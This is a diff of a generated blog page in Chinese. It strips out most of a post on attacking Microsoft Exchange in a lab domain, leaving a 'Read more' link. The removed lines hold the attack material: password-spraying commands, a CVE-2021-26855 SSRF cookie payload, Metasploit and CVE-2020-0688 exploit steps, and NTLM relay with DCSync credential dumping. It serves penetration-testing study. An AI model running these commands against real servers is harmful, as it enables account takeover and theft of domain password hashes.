@@ -187,7 +187,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-08-09 11:14:39" itemprop="dateModified" datetime="2021-08-09T11:14:39+08:00">2021-08-09</time>
+                <time title="Modified: 2021-08-09 11:15:08" itemprop="dateModified" datetime="2021-08-09T11:15:08+08:00">2021-08-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -214,169 +214,15 @@
 <p>Exchange Server（10.10.10.40）windows server 2012 R2  Exchange 2016 CU18 </p>
 <p>辅助DC (10.10.10.20)</p>
 <p>攻击机IP (10.10.10.142) </p>
-<p>域：c0okb.cn（域用户：<a href="mailto:&#116;&#101;&#x73;&#116;&#x4d;&#x65;&#109;&#98;&#x65;&#114;&#64;&#99;&#x30;&#111;&#107;&#x62;&#x2e;&#99;&#x6e;">&#116;&#101;&#x73;&#116;&#x4d;&#x65;&#109;&#98;&#x65;&#114;&#64;&#99;&#x30;&#111;&#107;&#x62;&#x2e;&#99;&#x6e;</a>，<a href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#x69;&#115;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#x63;&#48;&#111;&#107;&#x62;&#46;&#99;&#x6e;">&#x61;&#x64;&#109;&#x69;&#x6e;&#x69;&#115;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#x63;&#48;&#111;&#107;&#x62;&#46;&#99;&#x6e;</a>）</p>
-<h1 id="发现Exchange"><a href="#发现Exchange" class="headerlink" title="发现Exchange"></a>发现Exchange</h1><h2 id="端口扫描探测"><a href="#端口扫描探测" class="headerlink" title="端口扫描探测"></a>端口扫描探测</h2><p><img src="/attach/image/1.png" alt="image-20210803172815811"></p>
-<p><img src="/attach/image/2.png" alt="image-20210803172933492"></p>
-<h2 id="特殊后缀"><a href="#特殊后缀" class="headerlink" title="特殊后缀"></a>特殊后缀</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">https://ServerAddress/AutoDiscover/  该接口能用于爆破账号密码</span><br><span class="line">用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程</span><br><span class="line"></span><br><span class="line">https://ServerAddress/Ecp/  </span><br><span class="line">管理员用于管理组织中的Exchange的Web控制台</span><br><span class="line"></span><br><span class="line">https://ServerAddress/EWS/  该接口能用于爆破账号密码</span><br><span class="line">实现客户端与服务端之间基于HTTP的SOAP交互</span><br><span class="line"></span><br><span class="line">https://ServerAddress/mapi/</span><br><span class="line"></span><br><span class="line">https://ServerAddress/Microsoft-Server-ActiveSync/  该接口能用于爆破账号密码</span><br><span class="line">用于移动应用程序访问电子邮件</span><br><span class="line"></span><br><span class="line">https://ServerAddress/OAB/</span><br><span class="line">用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担</span><br><span class="line"></span><br><span class="line">https://ServerAddress/OWA/ 该接口能用于爆破账号密码</span><br><span class="line">用于通过web应用程序访问邮件、日历、任务和联系人等</span><br><span class="line"></span><br><span class="line">https://ServerAddress/PowerShell/</span><br><span class="line">用于服务器管理的Exchange管理控制台</span><br><span class="line"></span><br><span class="line">https://ServerAddress/Rpc/  </span><br></pre></td></tr></table></figure>
-
-<p>其中能用于账号密码爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/AutoDiscover/</span><br><span class="line">/EWS/</span><br><span class="line">/OWA/</span><br><span class="line">/Rpc/ </span><br></pre></td></tr></table></figure>
-
-<h2 id="特殊域名"><a href="#特殊域名" class="headerlink" title="特殊域名"></a>特殊域名</h2><p>通过一些特殊的子域名在互联网中发现Exchange服务器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://autodiscover.domain.com/autodiscover/autodiscover.xml</span><br><span class="line">https://owa.domian/owa/</span><br><span class="line">https://mail.domain.com/</span><br><span class="line">https://webmail.domain.com/</span><br></pre></td></tr></table></figure>
-
-<h2 id="查看Exchange版本"><a href="#查看Exchange版本" class="headerlink" title="查看Exchange版本"></a>查看Exchange版本</h2><p>在outlook界面查看源代码，通过查看link标签中的数字与链接</p>
-<p><img src="/attach/image/17.png" alt="image-20210805013029075"></p>
-<p>通过其中的数字与官方的内部版本号进行对比即可判断版本。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/18.png" alt="image-20210805013403796"></p>
-<h1 id="Exchange账号密码爆破"><a href="#Exchange账号密码爆破" class="headerlink" title="Exchange账号密码爆破"></a>Exchange账号密码爆破</h1><p>在Exchange服务中，以下几个接口可以用于账号密码的爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/AutoDiscover/</span><br><span class="line">/EWS/</span><br><span class="line">/OWA/</span><br><span class="line">/Microsoft-Server-ActiveSync/</span><br></pre></td></tr></table></figure>
-
-<h2 id="收集邮箱信息"><a href="#收集邮箱信息" class="headerlink" title="收集邮箱信息"></a>收集邮箱信息</h2><p>工具：<a target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper">MailSniper</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\MailSniper.ps1</span><br><span class="line">Get-GlobalAddressList -ExchHostname 10.10.10.40 -UserName c0okb.cn\testMember -Password Buzhidao250. -OutFile out.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/16.png" alt="image-20210805012434745"></p>
-<h2 id="利用AutoDiscover接口进行密码爆破"><a href="#利用AutoDiscover接口进行密码爆破" class="headerlink" title="利用AutoDiscover接口进行密码爆破"></a>利用AutoDiscover接口进行密码爆破</h2><p>工具：<a target="_blank" rel="noopener" href="https://github.com/sensepost/ruler">Ruler</a></p>
-<p>利用该接口，可以对邮箱账号密码进行爆破。利用工具Ruler对该接口进行认证的暴力破解，该工具可以配置线程数、间隔时间可以限制破解速度防止多次登陆失败触发告警或账户被封禁。</p>
-<p><img src="/attach/image/11.png" alt="image-20210804194701949"></p>
-<h2 id="利用owa接口进行密码爆破"><a href="#利用owa接口进行密码爆破" class="headerlink" title="利用owa接口进行密码爆破"></a>利用owa接口进行密码爆破</h2><p>工具：MailSniper</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-PasswordSprayOWA</span> <span class="literal">-ExchHostname</span> <span class="number">10.10</span>.<span class="number">10.40</span> <span class="literal">-UserList</span> .\user.txt <span class="literal">-Password</span> <span class="number">1</span>qaz@WSX <span class="literal">-Threads</span> <span class="number">1</span> <span class="literal">-Domain</span> c0okb.cn <span class="literal">-OutFile</span> out.txt <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/3.png" alt="image-20210804104818435"></p>
-<h2 id="利用ews接口进行密码爆破"><a href="#利用ews接口进行密码爆破" class="headerlink" title="利用ews接口进行密码爆破"></a>利用ews接口进行密码爆破</h2><p>工具：MailSniper</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-PasswordSprayEWS</span> <span class="literal">-ExchHostname</span> <span class="number">10.10</span>.<span class="number">10.40</span> <span class="literal">-UserList</span> .\user.txt <span class="literal">-Password</span> <span class="number">1</span>qaz@WSX <span class="literal">-Threads</span> <span class="number">1</span> <span class="literal">-Domain</span> c0okb.cn <span class="literal">-OutFile</span> out.txt <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/4.png" alt="image-20210804105821714"></p>
-<h2 id="利用Microsoft-Server-ActiveSync接口进行密码爆破"><a href="#利用Microsoft-Server-ActiveSync接口进行密码爆破" class="headerlink" title="利用Microsoft-Server-ActiveSync接口进行密码爆破"></a>利用<strong>Microsoft-Server-ActiveSync</strong>接口进行密码爆破</h2><p>工具：MailSniper</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEAS -ExchHostname 10.10.10.40 -UserList .\user.txt -Password 1qaz@WSX -Threads 1 -Domain c0okb.cn -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/5.PNG" alt="image-20210804110312558"></p>
-<h1 id="Exchange-历史漏洞总结"><a href="#Exchange-历史漏洞总结" class="headerlink" title="Exchange 历史漏洞总结"></a>Exchange 历史漏洞总结</h1><h2 id="CVE-2021-34473"><a href="#CVE-2021-34473" class="headerlink" title="CVE-2021-34473"></a>CVE-2021-34473</h2><p>Microsoft Exchange Server存在远程执行代码漏洞，未经身份验证的远程攻击者向服务器发送精心构造的请求，可在目标服务器上执行任意代码。</p>
-<p>影响版本：</p>
-<p>Microsoft Exchange Server 2019 Cumulative Update 9</p>
-<p>Microsoft Exchange Server 2013 Cumulative Update 23</p>
-<p>Microsoft Exchange Server 2019 Cumulative Update 8</p>
-<p>Microsoft Exchange Server 2016 Cumulative Update 19</p>
-<p>Microsoft Exchange Server 2016 Cumulative Update 20</p>
-<p>PS: 未有公开完整的EXP</p>
-<p>参考文章：</p>
-<p><a target="_blank" rel="noopener" href="https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/">https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/</a></p>
-<p><a target="_blank" rel="noopener" href="https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1">https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1</a></p>
-<h2 id="CVE-2021-28482"><a href="#CVE-2021-28482" class="headerlink" title="CVE-2021-28482"></a>CVE-2021-28482</h2><p>影响版本：</p>
-<p>Microsoft Exchange Server 2019 Cumulative Update 8</p>
-<p>Microsoft Exchange Server 2019 Cumulative Update 9</p>
-<p>Microsoft Exchange Server 2016 Cumulative Update 19</p>
-<p>Microsoft Exchange Server 2016 Cumulative Update 20</p>
-<p>Microsoft Exchange Server 2013 Cumulative Update 23</p>
-<p>利用条件：需要一个普通账户</p>
-<p>测试版本：Exchange Server 2016 CU12 (失败)</p>
-<p>EXP<br><a target="_blank" rel="noopener" href="https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda">https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda</a></p>
-<p>可参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://testbnull.medium.com/microsoft-exchange-from-deserialization-to-post-auth-rce-cve-2021-28482-e713001d915f">https://testbnull.medium.com/microsoft-exchange-from-deserialization-to-post-auth-rce-cve-2021-28482-e713001d915f</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=2ludXDGfOlQ">https://www.youtube.com/watch?v=2ludXDGfOlQ</a></p>
-<p>PS: 在复现过程中用github的现有工具<a target="_blank" rel="noopener" href="https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda">testanull</a>，复现失败，此处存疑，可能是版本问题，或者工具自身问题，待研究。</p>
-<h2 id="CVE-2021-26855"><a href="#CVE-2021-26855" class="headerlink" title="CVE-2021-26855"></a>CVE-2021-26855</h2><p>影响版本：</p>
-<p>Microsoft Exchange 2013</p>
-<p>Microsoft Exchange 2016 cu18</p>
-<p>Microsoft Exchange 2019</p>
-<p>Microsoft Exchange 2010</p>
-<p>介绍：该漏洞是Exchange中的服务端请求伪造漏洞（SSRF），利用此漏洞的攻击者能够发送任意HTTP请求并绕过Exchange Server身份验证，远程未授权的攻击者可以利用该漏洞以进行内网探测，并可以用于窃取用户邮箱的全部内容。</p>
-<p>利用路径</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/owa/auth/x.js　</span><br><span class="line">/owa/auth/Current/themes/resources/logon.css</span><br><span class="line">/owa/auth/Current/themes/resources/...</span><br><span class="line">/ecp/default.flt</span><br><span class="line">/ecp/main.css</span><br><span class="line">/ecp/&lt;single char&gt;.js</span><br></pre></td></tr></table></figure>
-
-<p>POC</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: X-AnonResource=true; X-AnonResource-Backend=*******/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/6.PNG" alt="image-20210804153813036"></p>
-<p>仅仅是SSRF不太行，结合CVE-2021-27065可以达到RCE的效果，</p>
-<p>CVE-2021-27065：该漏洞是Exchange中的任意文件写入漏洞。该漏洞需要进行身份认证，利用此漏洞可以将文件写入服务器上的任何路径。并可以结合利用CVE-2021-26855 SSRF漏洞或绕过权限认证进行文件写入。</p>
-<p>EXP: <a target="_blank" rel="noopener" href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/master/Exchange/CVE-2021-26855%20Exchange%20RCE/exp.py">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/master/Exchange/CVE-2021-26855%20Exchange%20RCE/exp.py</a></p>
-<p><img src="/attach/image/7.png" alt="image-20210804165537533"></p>
-<p><img src="/attach/image/8.png" alt="image-20210804165615375"></p>
-<h2 id="CVE-2020-17144"><a href="#CVE-2020-17144" class="headerlink" title="CVE-2020-17144"></a>CVE-2020-17144</h2><p>影响版本：</p>
-<p>Microsoft Exchange 2010 SP3 update Rollup 31</p>
-<p>利用条件：需要一个普通账号</p>
-<p>EXP1： <a target="_blank" rel="noopener" href="https://github.com/Airboi/CVE-2020-17144-EXP">https://github.com/Airboi/CVE-2020-17144-EXP</a></p>
-<p><img src="/attach/image/23.png" alt="image-20210806185334505"></p>
-<p><img src="/attach/image/24.png" alt="image-20210806185426622"></p>
-<p>EXP2：<a target="_blank" rel="noopener" href="https://github.com/zcgonvh/CVE-2020-17144">https://github.com/zcgonvh/CVE-2020-17144</a></p>
-<h2 id="CVE-2020-16875"><a href="#CVE-2020-16875" class="headerlink" title="CVE-2020-16875"></a>CVE-2020-16875</h2><p>漏洞描述：远程攻击者通过构造特殊的cmdlet参数，可造成任意命令执行。</p>
-<p>影响版本：</p>
-<p>Microsoft Exchange 2016 cu 16/17</p>
-<p>Microsoft Exchange 2019 cu 5/6</p>
-<p>利用条件：需要一个普通账号</p>
-<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>POC：<a target="_blank" rel="noopener" href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p>
-<p><img src="/attach/image/9.png" alt="image-20210804175553431"></p>
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>MSF漏洞利用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">搜索模块</span><br><span class="line">search exchange 或者 CVE-2020-16875</span><br><span class="line"></span><br><span class="line">进入渗透模块</span><br><span class="line">use exploit/windows/http/exchange_ecp_dlp_policy</span><br><span class="line"></span><br><span class="line">查看详细</span><br><span class="line">msf6 exploit(windows/http/exchange_ecp_dlp_policy) &gt; info</span><br><span class="line"></span><br><span class="line">查看</span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">输入攻击信息</span><br><span class="line">set RHOSTS 206.201.40.96</span><br><span class="line"></span><br><span class="line">set USERNAME Administrator</span><br><span class="line"></span><br><span class="line">set PASSWORD assw0rd!</span><br><span class="line"></span><br><span class="line">set LHOST 206.201.40.96</span><br><span class="line"></span><br><span class="line">开始攻击</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<h2 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h2><p>漏洞描述：当攻击者通过各种手段获得一个可以访问Exchange Control Panel （ECP）组件的用户账号密码，就可以在被攻击的exchange上执行任意代码，直接获取服务器权限。</p>
-<p>影响版本：</p>
-<p>Microsoft Exchange 2010 SP3 update Rollup 30</p>
-<p>Microsoft Exchange 2013 cu 23</p>
-<p>Microsoft Exchange 2016 cu 14/15</p>
-<p>Microsoft Exchange 2019 cu 3/4</p>
-<p>利用条件：需要有一个普通用户账号</p>
-<p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/Ridter/cve-2020-0688">https://github.com/Ridter/cve-2020-0688</a></p>
-<p>执行EXP如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-0688.py -s https://192.168.111.182/owa/ -u administrator@c0okb.cn -p xxxxxxxx -c calc</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/12.PNG" alt="image-20210805010106317"></p>
-<p>工具：<a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net/releases/tag/v1.33">https://github.com/pwntester/ysoserial.net/releases/tag/v1.33</a></p>
-<p>运行ysoserial.exe</p>
-<p><img src="/attach/image/13.png" alt="image-20210805004013026"></p>
-<p>生成的payload，在python脚本中回车，返回500</p>
-<p><img src="/attach/image/14.png" alt="image-20210805010215849"></p>
-<p>命令执行成功</p>
-<p><img src="/attach/image/15.png" alt="image-20210805004647785"></p>
-<h1 id="Exchange内网利用"><a href="#Exchange内网利用" class="headerlink" title="Exchange内网利用"></a>Exchange内网利用</h1><h2 id="CVE-2018-8581"><a href="#CVE-2018-8581" class="headerlink" title="CVE-2018-8581"></a>CVE-2018-8581</h2><p>这个漏洞利用一个可以正常登入的普通用户账户，通过ssrf调用Exchange Server凭证到已控制的内网服务器上，并默认Exchange Server权限较高，就达到了提权的目的。</p>
-<p>影响版本：</p>
-<p>Exchange Server 2010  </p>
-<p>Exchange Server 2013</p>
-<p>Exchange Server 2016</p>
-<p>PS:在测试过程中，发现累计更新版本过高的没法打，影响版本此次存疑</p>
-<h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python2 Exchange2domain.py -ah <span class="number">10.10</span><span class="number">.10</span><span class="number">.139</span> -ap <span class="number">80</span> -u testMember -p <span class="string">&quot;Buzhidao250.&quot;</span> -d c0okb.cn -th <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.40</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PrivExchange">Privexchange</a>，一个普通的用户账号密码</p>
-<p>攻击者开启NTLM中继</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 ntlmrelayx.py -t ldap://10.10.10.10 --escalate-user testMember</span><br></pre></td></tr></table></figure>
-
-<p>攻击Exchange服务器，发起SSRF攻击，调用Exchange凭据到目标服务器</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python2 privexchange.py -ah <span class="number">10.10</span><span class="number">.10</span><span class="number">.139</span> exchange.c0okb.cn -u testMember -p <span class="string">&quot;Buzhidao250.&quot;</span> -d c0okb.cn --no-ssl --debug    </span><br></pre></td></tr></table></figure>
-
-<p>回调凭证信息到攻击者服务器，读取信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py c0okb/testMember:Buzhdiao250.@10.10.10.40 -dc-ip 10.10.10.10 -just-dc-user administrator</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/194080.html">原理看这里</a></p>
-<h2 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h2><p>用任何AD帐户，通过SMB连接到目标Exchange服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，为攻击者帐户授予DCSync权限。攻击者帐户使用DCSync转储AD中的所有密码哈希值。</p>
-<p>影响版本：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/107721.html">影响版本看这里</a></p>
-<p>PS: 在测试过程中，发现累计更新版本过高的没法打</p>
-<p>利用条件：已有域成员账号密码，存在一台exchange服务 </p>
-<h3 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h3><p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">impacket</a>，<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx">printbug</a></p>
-<p>（1）ntlmrelayx.py进行中继攻击</p>
-<p>执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议。其中–remove-mic选项用于清除MIC标志，–escalate-user用于提升指定用户权限</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 ntlmrelayx.py --escalate-user administrator -t ldap://<span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> -smb2support --remove-mic --delegate-access</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/19.png" alt="image-20210805123541060"></p>
-<p>（2）触发SpoolService的bug</p>
-<p>SpoolService的bug导致Exchange服务器回连到<code>ntlmrelayx.py</code>，即将NTLM认证信息发送到<code>ntlmrelayx.py</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 printerbug.py c0okb/administrator@<span class="number">10.10</span><span class="number">.10</span><span class="number">.40</span>  <span class="number">10.10</span><span class="number">.10</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/20.png" alt="image-20210805123617135"></p>
-<p><img src="/attach/image/21.png" alt="image-20210805123647738"></p>
-<p>（3）secretsdump.py去dcsync</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py c0okb/administrator@<span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> -dc-ip <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> -just-dc-user administrator</span><br></pre></td></tr></table></figure>
-
-<p><img src="/attach/image/22.png" alt="image-20210805123747409"></p>
-<p>PS:因为环境问题，所以复现过程直接用administrator演示。并且在复现过程中忽略内网代理这一步。</p>
-<h3 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h3><p>工具：<a target="_blank" rel="noopener" href="https://github.com/Ridter/RelayX">RelayX</a></p>
-<p>默认Exchange的服务权限较高，所以工具会利用Exchange的权限将当前用户增加Dcsync权限。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 relayx.py c0okb.cn/testMember:<span class="string">&#x27;Buzhidao250.&#x27;</span>@<span class="number">10.10</span><span class="number">.10</span><span class="number">.40</span> -r <span class="number">10.10</span><span class="number">.10</span><span class="number">.142</span> -dc-ip <span class="number">10.10</span><span class="number">.10</span><span class="number">.40</span></span><br></pre></td></tr></table></figure>
-
-<p>PS: 方法一和方法二实际上是一样的，方法二的工具将ntlm-relay和printBug集成在一起，方便使用</p>
-
+<p>域：c0okb.cn（域用户：<a href="mailto:&#116;&#x65;&#x73;&#116;&#x4d;&#101;&#109;&#98;&#x65;&#114;&#64;&#99;&#x30;&#111;&#107;&#98;&#x2e;&#x63;&#x6e;">&#116;&#x65;&#x73;&#116;&#x4d;&#101;&#109;&#98;&#x65;&#114;&#64;&#99;&#x30;&#111;&#107;&#98;&#x2e;&#x63;&#x6e;</a>，<a href="mailto:&#x61;&#100;&#x6d;&#x69;&#110;&#x69;&#115;&#116;&#114;&#97;&#116;&#x6f;&#x72;&#x40;&#x63;&#x30;&#x6f;&#x6b;&#x62;&#46;&#99;&#x6e;">&#x61;&#100;&#x6d;&#x69;&#110;&#x69;&#115;&#116;&#114;&#97;&#116;&#x6f;&#x72;&#x40;&#x63;&#x30;&#x6f;&#x6b;&#x62;&#46;&#99;&#x6e;</a>）</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/08/06/Exchange%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
